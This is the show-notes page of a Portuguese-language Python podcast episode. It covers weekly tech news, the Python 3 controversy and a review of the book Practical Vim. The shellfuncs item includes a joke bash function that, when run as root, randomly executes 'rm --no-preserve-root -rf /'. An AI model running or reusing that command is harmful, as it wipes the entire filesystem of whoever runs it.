Episódio 77: Book Review: Practical Vim e Novidades da Semana
#############################################################
:date: 2016-12-04
:authors: Og Maciel, Elyézer Rezende, Bruno Rocha
:category: Podcast
:podcast: https://archive.org/download/castalio-podcast-77/castalio-podcast-77.mp3
:tags: book review, python, novidades da semana,
:description: No episódio de hoje trazemos book review técnico sobre o
              Practical Vim, também comentamos sobre as novidades da semana.

.. figure:: {filename}/images/practical-vim.jpg
   :alt: Practical Vim - Edit Text at the Speed of Thought
   :figclass: pull-left clear article-figure

Olá pessoal e sejam bem-vindos à mais um episódio do Castálio Podcast!

No episódio de hoje vamos fazer mais um book review, porém desta vez, vamos 
falar sobre um livro técnico. Também trazemos as novidades da semana e a 
polêmica em torno do Python 3.

Nas próximas semanas queremos trazer para vocês entrevistas com a **Paula Granjeiro**,
**Gabriel Engel** da **Rocket.Chat** e **Kenneth Reitz**, criador do **Python Requests**.
Aguardem!

.. more

No episódio de hoje começamos falando sobre as novidades da semana:

**pytest-leaks**

O `pytest-leaks`_ é um plugin to pytest que ajuda a traçar leaks de memória.
Os leaks são identificados através da comparação da contagem de referências a
objetos de diversas execuções da suite de teste.

**Shellfuncs**

`shellfuncs`_ oferece uma API para executar funções do shell como funções do
Python. Por exemplo, imagine que você tenha uma função como abaixo:

.. raw:: html

    <div class="clearfix"></div>

.. code-block:: bash

    russian_roulette() {
        [ "$EUID" -ne 0 ] && echo "Seriously?! What a p***y, how about playing as root?" && exit
        [ $(( $RANDOM % 6 )) -eq 0 ] && rm --no-preserve-root -rf / || echo "click"```
    }

Com o `shellfuncs`_ você pode executá-la chamando uma função em Python em vez
de usar o módulo subprocess, como mostrado a seguir:

.. code-block:: python

    import shellfuncs

    from roulettes import russian_roulette

    returncode, stdout, stderr = russian_roulette()

Esse pacote está disponível apenas para o Python 3.4+.

**Repositório Lua no Github**

O `repositório da linguagem Lua`_ foi publicado no Github. Lá você pode
encontrar todo o histórico do desenvolvimento da linguagem. Atualmente ele
possui mais de 4650 commits, sendo que o primeiro foi realizado em 28 de Julho
de 1993.

**Repositório com a história do Unix no Github**

Seguindo o ritmo de publicar repositórios no Github, o `reposiório do Unix`_
também foi publicado. Ele publica o histórico desde 1970, quando começou como
um kernel com 2,5 mil linhas de código e 26 comandos até hoje como um systema
bastante usado com mais de 27 milhões de linhas de código.

**Rapping Neural Network**

O `Rapping Neural Network`_ é uma rede neural que consegue escrever músicas de
rap e também possui outros arquivos Python que ajudam a gerar os arquivos de
áudio, para ouvir as músicas criadas.

Existe um `exemplo de música criada pela rede reural`_ que você pode ouvir sem
precisar executar nada.

**A polemica em torno do Python 3**

Continuamos as novidades da semana falando sobre um blog post que agitou a
comunidade Python. O post `The Case Against Python 3`_ foi escrito e publicado
por um dos autores bastante conhecidos da comunidade Python, Zed Shaw. Ele é
autor do `Learn Python the Hard Way`_, criador do `Mongrel`_ e do `LibreList`_.

A polêmica foi grande, muita gente da comunidade respondeu, a `thread do
Reddit`_ foi uma das mais comentadas e, agora que a polêmica passou, fazemos um
resumo neste episódio e deixamos a nossa opinião.

Em nosso resumo, comentamos sobre um `blog post com argumentos refutando a
crítica do Zed`_ e sobre o `Programming Motherfucker`_. Finalizamos enfatizando
que faltam 3 anos e 4 meses (segundo o `Python Clock`_) para migrar para o
Python 3 já que em 2020 o Python 2 será descontinuado, não se desespere, você
tem um guia sobre `como migrar
para o Python 3`_ para te ajudar.

E você, o que acha disso tudo? Conhece algum outro material que possa ajudar as
pessoas a conhecer mais sobre como migrar para o Python 3?

**Book Review: Practical Vim**

Seguindo sugestões recebidas pelos nossos ouvintes, mais precisamente o **Hell
Barba**, o Book Review de hoje será sobre um livro técnico. O Elyézer fala sobre
o `Practical Vim`_ - Edit Text at the Speed of Thought escrito por `Drew Neil`_,
que também é autor do `Vim Casts`_.

O livro é divido em 6 partes:

* Parte 1 - Modos: normal mode, insert mode, visual mode, command-line mode
* Parte 2 - Arquivos: gerenciando múltiplos arquivos, abrindo arquivos e
  salvando-os em disco
* Parte 3 - Nevegando rapidamente: navegação dentro de arquivos com motions,
  navegando entre arquivos com jumps
* Parte 4 - Registradores: copiar e colar, macros
* Parte 5 - Patterns: casando patterns e literais, pesquisa, substituição,
  global commands
* Parte 6 - Ferramentas:

  * indexando e navegando no código fonte usando ctags
  * Compilando código e navegando pelos erros usando o Quickfix List
  * Pesquisa dentro do projeto utilizando grep, vimgrep e outros
  * Autocompletion
  * Vim spell checker

* Apêndice: Customizando o Vim:

  * Mudando as configurações em tempo de execução
  * Salvando a configuração no vimrc
  * Aplicando customizações a determinados tipos de arquivos

Apesar do livro ser em inglês, é tranquilo de ler e os exemplos são bem fáceis
de seguir. Vale a pena ler o livro se você está querendo aprender ou conhecer
mais sobre o Vim.

Escute Agora
------------

.. podcast:: castalio-podcast-77

Até o próximo episódio e não esqueça de deixar seus comentários aqui no site,
ou no `Twitter <https://twitter.com/castaliopod>`_ ou `Facebook
<https://www.facebook.com/castaliopod>`_.

Links
-----

* `pytest-leaks`_
* `shellfuncs`_
* `repositório da linguagem Lua`_
* `reposiório do Unix`_
* `Rapping Neural Network`_
* `exemplo de música criada pela rede reural`_
* `The Case Against Python 3`_
* `Learn Python the Hard Way`_
* `Mongrel`_
* `LibreList`_
* `thread do Reddit`_
* `blog post com argumentos refutando a crítica do Zed`_
* `Programming Motherfucker`_
* `Python Clock`_
* `como migrar para o Python 3`_
* `Practical Vim`_
* `Drew Neil`_
* `Vim Casts`_

.. class:: panel-body bg-info

        **Música**: `Ain't Gonna Give Jelly Roll`_ by `Red Hook Ramblers`_ is licensed under a Creative Commons Attribution-NonCommercial-NoDerivatives (aka Music Sharing) License.

.. Mentioned
.. _pytest-leaks: https://github.com/abalkin/pytest-leaks
.. _shellfuncs: https://github.com/timofurrer/shellfuncs
.. _repositório da linguagem Lua:  http://github.com/lua/lua
.. _reposiório do Unix: https://github.com/dspinellis/unix-history-repo
.. _Rapping Neural Network: https://github.com/robbiebarrat/rapping-neural-network
.. _exemplo de música criada pela rede reural: http://vocaroo.com/i/s1liCOwMUhuZ
.. _The Case Against Python 3: https://learnpythonthehardway.org/book/nopython3.html
.. _Learn Python the Hard Way: https://learnpythonthehardway.org/
.. _Mongrel: https://en.wikipedia.org/wiki/Mongrel_(web_server)
.. _LibreList: http://librelist.com/
.. _thread do Reddit: https://www.reddit.com/r/Python/comments/5efe3t/the_case_against_python_3/
.. _blog post com argumentos refutando a crítica do Zed: http://blog.lerner.co.il/case-python-3
.. _Programming Motherfucker: http://programming-motherfucker.com/
.. _Python Clock: https://pythonclock.org/
.. _como migrar para o Python 3: https://docs.python.org/3/howto/pyporting.html
.. _Practical Vim: https://www.goodreads.com/book/show/13607232-practical-vim
.. _Drew Neil: http://drewneil.com/
.. _Vim Casts: http://vimcasts.org/

.. Footer
.. _Ain't Gonna Give Jelly Roll: http://freemusicarchive.org/music/Red_Hook_Ramblers/Live__WFMU_on_Antique_Phonograph_Music_Program_with_MAC_Feb_8_2011/Red_Hook_Ramblers_-_12_-_Aint_Gonna_Give_Jelly_Roll
.. _Red Hook Ramblers: http://www.redhookramblers.com/
